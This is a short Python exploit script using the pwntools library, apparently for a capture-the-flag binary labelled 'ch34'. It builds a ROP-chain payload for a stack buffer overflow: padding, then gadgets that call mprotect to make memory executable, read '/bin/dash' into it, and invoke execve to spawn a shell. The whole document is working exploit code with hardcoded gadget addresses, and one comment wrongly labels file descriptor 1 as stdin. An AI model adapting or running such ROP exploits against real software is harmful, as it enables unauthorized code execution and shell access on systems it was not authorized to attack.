from pwn import *


# RWX memory address
#ch34 = 0x69e000
ch34 = 0x400000

# ROP gadgets
syscall = 0x4616b5
pop_rax = 0x43bb5c
pop_rdi	= 0x4005f6
pop_rsi = 0x4058d5
pop2ret	= 0x43dbf9		# pop rdx; pop rsi; ret

# functions()
mprotect 	= 0x43c980
read		= 0x43bba0

payload = ""
payload += "A" * 280
payload += p64(pop_rdi)
payload += p64(ch34)
payload += p64(pop2ret)
payload += p64(0x7)
payload += p64(0x2000)
payload += p64(mprotect)

payload += p64(pop_rdi)
payload += p64(0x1)		# rdi - stdin
payload += p64(pop2ret)
payload += p64(0x9)		# rdx - 9 bytes '/bin/dash'
payload += p64(ch34)	# rwx - memory addres
payload += p64(read)	# call read

payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(pop_rdi)
payload += p64(ch34)
payload += p64(pop2ret)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(syscall)	

print payload
